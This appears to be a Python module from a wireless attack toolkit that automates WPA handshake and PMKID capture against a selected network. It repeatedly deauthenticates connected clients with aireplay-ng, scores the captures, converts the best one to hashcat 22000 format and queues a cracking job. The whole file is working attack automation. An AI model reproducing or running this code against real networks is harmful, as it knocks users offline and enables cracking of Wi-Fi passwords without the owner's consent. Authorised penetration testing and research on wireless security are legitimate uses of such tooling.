"""Advanced handshake capture engine."""

from __future__ import annotations

from dataclasses import asdict, dataclass, field
from datetime import datetime
import json
import shutil
import subprocess
import time
from pathlib import Path
from typing import Any, Optional

from rich import box
from rich.console import Group
from rich.live import Live
from rich.panel import Panel
from rich.table import Table

from app.safety import sanitize_filename
from app.ui import BORDER_STYLE
from attacks.commands import aireplay_deauth, airodump_capture, hcxdumptool_capture, hcxpcapngtool_convert
from attacks.hashcat_jobs import HashcatJobStore
from config import DEFAULT_WORDLIST, HANDSHAKE_CAPTURE_TIMEOUT_SECONDS, HANDSHAKE_DIR, TMP_DIR
from wifi.capture_quality import CaptureQualityReport, analyze_capture_quality
from wifi.client_profiler import build_client_profiles
from wifi.frame_intelligence import summarize_network_security


@dataclass(frozen=True)
class CapturePolicy:
    max_duration_seconds: int = HANDSHAKE_CAPTURE_TIMEOUT_SECONDS
    stop_on_crackable: bool = True
    quality_check_interval_seconds: float = 4.0
    client_refresh_interval_seconds: float = 5.0
    deauth_interval_seconds: float = 8.0
    max_clients_per_burst: int = 4
    deauth_packets_per_client: int = 2


@dataclass(frozen=True)
class CaptureTarget:
    bssid: str
    ssid: str
    channel: int
    cipher: str
    clients: tuple[str, ...]


@dataclass(frozen=True)
class DeauthStrategy:
    mode: str
    clients: tuple[str, ...]
    packet_count: int
    interval_seconds: float
    reason: str


@dataclass
class CaptureSession:
    session_id: str
    started_at: str
    interface: str
    target: CaptureTarget
    session_dir: Path
    output_prefix: Path
    manifest_path: Path
    pmkid_pcapng: Path
    pmkid_hash: Path
    status: str = "capturing"
    ended_at: str = ""
    duration_seconds: float = 0.0
    deauth_strategy: DeauthStrategy | None = None
    deauth_bursts: int = 0
    clients_targeted: set[str] = field(default_factory=set)
    quality_history: list[dict[str, Any]] = field(default_factory=list)
    best_capture: str = ""
    best_score: int = 0
    best_verdict: str = "unusable"
    hash_file: str = ""
    hashcat_job_id: str = ""
    notes: list[str] = field(default_factory=list)

    def to_manifest(self) -> dict[str, Any]:
        data = asdict(self)
        data["session_dir"] = str(self.session_dir)
        data["output_prefix"] = str(self.output_prefix)
        data["manifest_path"] = str(self.manifest_path)
        data["pmkid_pcapng"] = str(self.pmkid_pcapng)
        data["pmkid_hash"] = str(self.pmkid_hash)
        data["clients_targeted"] = sorted(self.clients_targeted)
        return data


def run_handshake_capture_engine(app) -> None:
    """Capture a handshake with quality scoring, adaptive deauth, promotion, and manifest output."""
    if not app.selected_network:
        app.console.print("[bold red]Please select a target network first![/]")
        return

    target = build_capture_target(app.selected_network, app.networks[app.selected_network])
    policy = CapturePolicy()
    session = create_capture_session(app.interface_name, target)
    security_profile = summarize_network_security(
        {
            "ssid": target.ssid,
            "cipher": target.cipher,
            "clients": set(target.clients),
        }
    )
    strategy = choose_deauth_strategy(target, security_profile, app.networks, policy)
    session.deauth_strategy = strategy
    write_manifest(session)

    dump_proc: Optional[subprocess.Popen] = None
    pmkid_proc: Optional[subprocess.Popen] = None
    last_quality_check = 0.0
    last_client_refresh = 0.0
    last_deauth = 0.0
    best_report: Optional[CaptureQualityReport] = None
    started = time.time()

    try:
        app.console.print(f"[info]Capture session:[/] [cyan]{session.session_id}[/]")
        dump_proc = subprocess.Popen(
            airodump_capture(
                app.interface_name,
                channel=target.channel,
                bssid=target.bssid,
                output_prefix=session.output_prefix,
                wpa3=bool(security_profile["wpa3"]),
            ),
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        if app.command_runner.which("hcxdumptool") is not None:
            pmkid_proc = subprocess.Popen(
                hcxdumptool_capture(app.interface_name, session.pmkid_pcapng, target.channel),
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            session.notes.append("hcxdumptool PMKID source enabled")
        else:
            session.notes.append("hcxdumptool not found; PMKID source skipped")

        with Live(_render_capture_status(session, best_report), console=app.console, refresh_per_second=4) as live:
            while True:
                now = time.time()
                elapsed = now - started
                session.duration_seconds = round(elapsed, 2)

                if dump_proc.poll() is not None:
                    session.notes.append(f"airodump-ng exited with code {dump_proc.returncode}")
                    if not best_report or best_report.verdict == "unusable":
                        session.status = "failed"
                    else:
                        session.status = "incomplete"
                    break

                if now - last_client_refresh >= policy.client_refresh_interval_seconds:
                    last_client_refresh = now
                    target = refresh_target_clients(app, target)
                    strategy = choose_deauth_strategy(target, security_profile, app.networks, policy)
                    session.target = target
                    session.deauth_strategy = strategy

                if now - last_deauth >= strategy.interval_seconds and strategy.mode != "passive":
                    last_deauth = now
                    run_deauth_burst(app, target, strategy, session)

                if now - last_quality_check >= policy.quality_check_interval_seconds:
                    last_quality_check = now
                    refresh_pmkid_hash(app, session)
                    best_report = analyze_best_capture(session, target)
                    update_session_quality(session, best_report)
                    write_manifest(session)

                live.update(_render_capture_status(session, best_report))
                if should_stop_capture(best_report, policy, elapsed):
                    session.status = "captured"
                    break
                if elapsed >= policy.max_duration_seconds:
                    session.status = "timeout" if session.best_verdict != "crackable" else "captured"
                    break
                time.sleep(0.25)
    except KeyboardInterrupt:
        session.status = "stopped"
        app.console.print("\n[bold yellow]Handshake capture stopped by user.[/]")
    except Exception as exc:
        session.status = "error"
        session.notes.append(f"Error: {exc}")
        app.logger.error(f"Advanced handshake capture error: {exc}")
        app.console.print(f"\n[bold red]Error in handshake capture: {exc}[/]")
    finally:
        stop_process(dump_proc)
        stop_process(pmkid_proc)

        refresh_pmkid_hash(app, session)
        best_report = analyze_best_capture(session, target)
        update_session_quality(session, best_report)
        promoted = promote_best_capture(session, target, best_report)
        if promoted:
            session.best_capture = str(promoted)
            session.notes.append(f"Best capture promoted to {promoted}")
            hash_file = export_hashcat_22000(app, promoted)
            if hash_file:
                session.hash_file = str(hash_file)
        elif best_report and Path(best_report.path).suffix.lower() in {".22000", ".16800", ".hash", ".hc22000"}:
            session.hash_file = best_report.path
        if not session.hash_file and session.pmkid_hash.exists() and session.pmkid_hash.stat().st_size > 0:
            session.hash_file = str(session.pmkid_hash)
        if session.hash_file:
            job_id = queue_hashcat_job(Path(session.hash_file))
            if job_id:
                session.hashcat_job_id = job_id
        session.ended_at = datetime.now().isoformat(timespec="seconds")
        session.duration_seconds = round(time.time() - started, 2)
        if session.best_verdict == "crackable" and session.status in {"capturing", "failed", "incomplete", "timeout"}:
            session.status = "captured"
        elif session.status == "capturing":
            session.status = "captured" if session.best_verdict == "crackable" else "incomplete"
        elif session.status == "failed" and session.best_verdict != "unusable":
            session.status = "incomplete"
        write_manifest(session)
        app.console.print(_render_capture_summary(session))
        app.logger.info(
            "Handshake capture session %s completed: status=%s score=%s verdict=%s",
            session.session_id,
            session.status,
            session.best_score,
            session.best_verdict,
        )
        app.current_menu = "attack"


def build_capture_target(bssid: str, network: dict[str, Any]) -> CaptureTarget:
    return CaptureTarget(
        bssid=str(bssid),
        ssid=str(network.get("ssid", "Unknown")),
        channel=_safe_int(network.get("channel", 1), 1),
        cipher=str(network.get("cipher", network.get("security", "Unknown"))),
        clients=tuple(sorted(str(client) for client in (network.get("clients", set()) or set()))),
    )


def create_capture_session(interface: str, target: CaptureTarget) -> CaptureSession:
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe_ssid = sanitize_filename(target.ssid, fallback="network")
    safe_bssid = sanitize_filename(target.bssid.replace(":", ""), fallback="bssid")
    session_id = f"{safe_ssid}_{safe_bssid}_{timestamp}"
    session_dir = HANDSHAKE_DIR / session_id
    session_dir.mkdir(parents=True, exist_ok=True)
    output_prefix = session_dir / f"capture_{session_id}"
    return CaptureSession(
        session_id=session_id,
        started_at=datetime.now().isoformat(timespec="seconds"),
        interface=interface,
        target=target,
        session_dir=session_dir,
        output_prefix=output_prefix,
        manifest_path=session_dir / "capture_manifest.json",
        pmkid_pcapng=session_dir / f"pmkid_{session_id}.pcapng",
        pmkid_hash=session_dir / f"pmkid_{session_id}.22000",
    )


def refresh_target_clients(app, target: CaptureTarget) -> CaptureTarget:
    try:
        with app._networks_lock:
            network = app.networks.get(target.bssid, {})
            clients = tuple(sorted(str(client) for client in (network.get("clients", set()) or set())))
    except Exception:
        clients = target.clients
    return CaptureTarget(
        bssid=target.bssid,
        ssid=target.ssid,
        channel=target.channel,
        cipher=target.cipher,
        clients=clients,
    )


def choose_deauth_strategy(
    target: CaptureTarget,
    security_profile: dict[str, Any],
    networks: dict[str, dict[str, Any]],
    policy: CapturePolicy,
) -> DeauthStrategy:
    clients = prioritize_clients(target, networks)[: policy.max_clients_per_burst]
    if security_profile.get("pmf_required"):
        return DeauthStrategy(
            mode="passive",
            clients=(),
            packet_count=0,
            interval_seconds=max(policy.deauth_interval_seconds, 15.0),
            reason="PMF required; active deauthentication disabled",
        )
    if clients:
        mode = "targeted-transition" if security_profile.get("transition_mode") else "targeted"
        return DeauthStrategy(
            mode=mode,
            clients=tuple(clients),
            packet_count=policy.deauth_packets_per_client,
            interval_seconds=policy.deauth_interval_seconds,
            reason="Prioritized associated clients",
        )
    return DeauthStrategy(
        mode="broadcast",
        clients=(),
        packet_count=1,
        interval_seconds=max(policy.deauth_interval_seconds * 2, 15.0),
        reason="No associated clients observed",
    )


def prioritize_clients(target: CaptureTarget, networks: dict[str, dict[str, Any]]) -> list[str]:
    profiles = build_client_profiles(networks)
    target_clients = set(target.clients)
    ordered = [profile.mac for profile in profiles if profile.mac in target_clients]
    ordered.extend(client for client in target.clients if client not in ordered)
    return ordered


def run_deauth_burst(app, target: CaptureTarget, strategy: DeauthStrategy, session: CaptureSession) -> None:
    try:
        if strategy.clients:
            for client in strategy.clients:
                subprocess.run(
                    aireplay_deauth(
                        app.interface_name,
                        bssid=target.bssid,
                        count=strategy.packet_count,
                        client=client,
                    ),
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    timeout=15,
                )
                session.clients_targeted.add(client)
        else:
            subprocess.run(
                aireplay_deauth(app.interface_name, bssid=target.bssid, count=strategy.packet_count),
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                timeout=15,
            )
        session.deauth_bursts += 1
    except Exception as exc:
        session.notes.append(f"Deauth burst failed: {exc}")


def analyze_best_capture(session: CaptureSession, target: CaptureTarget) -> Optional[CaptureQualityReport]:
    reports = []
    for path in sorted(session.session_dir.glob(f"{session.output_prefix.name}*.cap")):
        if not path.is_file():
            continue
        reports.append(analyze_capture_quality(path, bssid=target.bssid, essid=target.ssid))
    if session.pmkid_hash.exists() and session.pmkid_hash.stat().st_size > 0:
        reports.append(analyze_capture_quality(session.pmkid_hash, bssid=target.bssid, essid=target.ssid))
    if not reports:
        return None
    return max(reports, key=lambda report: (report.score, report.path))


def refresh_pmkid_hash(app, session: CaptureSession) -> Optional[Path]:
    if app.command_runner.which("hcxpcapngtool") is None:
        return None
    if not session.pmkid_pcapng.exists() or session.pmkid_pcapng.stat().st_size <= 0:
        return None
    try:
        subprocess.run(
            hcxpcapngtool_convert(session.pmkid_hash, session.pmkid_pcapng),
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            timeout=60,
        )
    except Exception as exc:
        session.notes.append(f"PMKID hash refresh failed: {exc}")
        return None
    if session.pmkid_hash.exists() and session.pmkid_hash.stat().st_size > 0:
        return session.pmkid_hash
    return None


def update_session_quality(session: CaptureSession, report: Optional[CaptureQualityReport]) -> None:
    if not report:
        return
    session.best_score = report.score
    session.best_verdict = report.verdict
    session.best_capture = report.path
    session.quality_history.append(
        {
            "time": datetime.now().isoformat(timespec="seconds"),
            "path": report.path,
            "score": report.score,
            "verdict": report.verdict,
            "eapol_messages": report.eapol_messages,
            "replay_pairs": report.replay_pairs,
            "reasons": list(report.reasons),
        }
    )
    session.quality_history[:] = session.quality_history[-60:]


def should_stop_capture(report: Optional[CaptureQualityReport], policy: CapturePolicy, elapsed: float) -> bool:
    if elapsed < 5:
        return False
    return bool(policy.stop_on_crackable and report and report.verdict == "crackable")


def promote_best_capture(
    session: CaptureSession,
    target: CaptureTarget,
    report: Optional[CaptureQualityReport],
) -> Optional[Path]:
    if not report or report.verdict == "unusable":
        return None
    if report.format != "pcap" or Path(report.path).suffix.lower() != ".cap":
        return None
    source = Path(report.path)
    if not source.exists():
        return None
    safe_ssid = sanitize_filename(target.ssid, fallback="network")
    safe_bssid = sanitize_filename(target.bssid.replace(":", ""), fallback="bssid")
    destination = HANDSHAKE_DIR / f"handshake_{safe_ssid}_{safe_bssid}_{session.session_id[-15:]}_best.cap"
    if source.resolve() != destination.resolve():
        shutil.copy2(source, destination)
    return destination


def export_hashcat_22000(app, capture_file: Path) -> Optional[Path]:
    if app.command_runner.which("hcxpcapngtool") is None:
        return None
    output_file = capture_file.with_suffix(".22000")
    try:
        subprocess.run(
            hcxpcapngtool_convert(output_file, capture_file),
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            timeout=60,
        )
    except Exception:
        return None
    if output_file.exists() and output_file.stat().st_size > 0:
        return output_file
    return None


def queue_hashcat_job(hash_file: Path) -> str:
    if not DEFAULT_WORDLIST.exists():
        return ""
    store = HashcatJobStore(TMP_DIR / "hashcat_jobs.json")
    job = store.create_job(hash_file=hash_file, wordlist=DEFAULT_WORDLIST, mode=22000, workload=3)
    return job.job_id


def write_manifest(session: CaptureSession) -> None:
    session.manifest_path.write_text(
        json.dumps(session.to_manifest(), indent=2, sort_keys=True),
        encoding="utf-8",
    )


def stop_process(process: Optional[subprocess.Popen]) -> None:
    if not process:
        return
    try:
        process.terminate()
        process.wait(timeout=2)
    except Exception:
        try:
            process.kill()
            process.wait(timeout=1)
        except Exception:
            pass


def _render_capture_status(session: CaptureSession, report: Optional[CaptureQualityReport]) -> Panel:
    strategy = session.deauth_strategy or DeauthStrategy("unknown", (), 0, 0, "pending")
    table = Table(show_header=True, header_style="bold magenta", box=box.MINIMAL, border_style=BORDER_STYLE)
    table.add_column("BSSID", style="cyan")
    table.add_column("Channel", style="green", justify="right")
    table.add_column("SSID", style="yellow")
    table.add_column("Clients", style="cyan", justify="right")
    table.add_column("Strategy", style="magenta")
    table.add_column("Bursts", style="blue", justify="right")
    table.add_column("Score", style="green", justify="right")
    table.add_column("Verdict", style="yellow")
    table.add_column("EAPOL", style="white")
    eapol = "-"
    if report and report.eapol_messages:
        eapol = ", ".join(f"{key}:{value}" for key, value in sorted(report.eapol_messages.items()))
    table.add_row(
        session.target.bssid,
        str(session.target.channel),
        session.target.ssid,
        str(len(session.target.clients)),
        strategy.mode,
        str(session.deauth_bursts),
        str(session.best_score),
        session.best_verdict,
        eapol,
    )
    details = Table(show_header=False, box=box.MINIMAL, border_style=BORDER_STYLE)
    details.add_column("Field", style="dim", no_wrap=True)
    details.add_column("Value", style="white")
    details.add_row("Elapsed", f"{session.duration_seconds:.1f}s")
    details.add_row("Status", session.status)
    details.add_row("Session", session.session_id)
    details.add_row("Manifest", str(session.manifest_path))
    return Panel(Group(table, details), title="[bold]Advanced Handshake Capture[/]", border_style=BORDER_STYLE, box=box.ROUNDED)


def _render_capture_summary(session: CaptureSession) -> Panel:
    table = Table(show_header=False, box=box.MINIMAL, border_style=BORDER_STYLE)
    table.add_column("Field", style="cyan", no_wrap=True)
    table.add_column("Value", style="white")
    table.add_row("Status", session.status)
    table.add_row("Best verdict", session.best_verdict)
    table.add_row("Best score", str(session.best_score))
    table.add_row("Best artifact", session.best_capture or "-")
    table.add_row("Hashcat 22000", session.hash_file or "-")
    table.add_row("Hashcat job", session.hashcat_job_id or "-")
    table.add_row("Manifest", str(session.manifest_path))
    table.add_row("Deauth bursts", str(session.deauth_bursts))
    return Panel(table, title="[bold green]Capture Summary[/]", border_style=BORDER_STYLE, box=box.ROUNDED)


def _safe_int(value: object, default: int) -> int:
    try:
        return int(value)
    except (TypeError, ValueError):
        return default
